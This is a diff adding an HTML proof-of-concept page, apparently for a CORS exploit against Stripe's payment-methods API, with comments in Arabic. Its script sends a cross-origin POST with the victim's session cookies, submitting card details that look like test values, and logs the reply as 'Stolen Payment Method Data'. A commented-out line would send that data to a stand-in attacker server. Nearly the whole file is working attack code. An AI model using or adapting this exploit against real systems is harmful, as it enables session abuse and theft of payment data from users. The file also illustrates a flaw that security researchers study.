@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>CORS Exploit PoC - Stripe</title>
+</head>
+<body>
+    <h2>Exploit Running... Check Console or Exfiltration Server</h2>
+    <script>
+        const targetUrl = "https://api.stripe.com/v1/payment_methods";
+
+        // الـ Body الكامل لنفس الـ Request
+        const postData = "type=card&card[number]=4539382852159718&card[cvc]=163&card[exp_month]=09&card[exp_year]=31&billing_details[name]=Sammie+Brakus&billing_details[email]=ruvhio%40zmail.edu.pl&billing_details[address][line1]=253+Mayer+Courts&billing_details[address][city]=hamed&billing_details[address][postal_code]=86252-6922";
+
+        fetch(targetUrl, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/x-www-form-urlencoded"
+            },
+            credentials: "include", // أساسي عشان يبعت الـ Cookies/Session مع الطلب
+            body: postData
+        })
+        .then(response => response.json())
+        .then(data => {
+            // هيطبع الـ JSON الكامل اللي في الاستجابة قدامك في الكونسول
+            console.log("Stolen Payment Method Data:", data);
+
+            // خطوة إضافية لو عايز تسرق الداتا وتبعتها لسيرفر خارجي تملكه (Data Exfiltration):
+            // fetch("https://your-attacker-server.com/log?data=" + encodeURIComponent(JSON.stringify(data)));
+        })
+        .catch(error => {
+            console.error("Exploit Failed:", error);
+        });
+    </script>
+</body>
+</html>
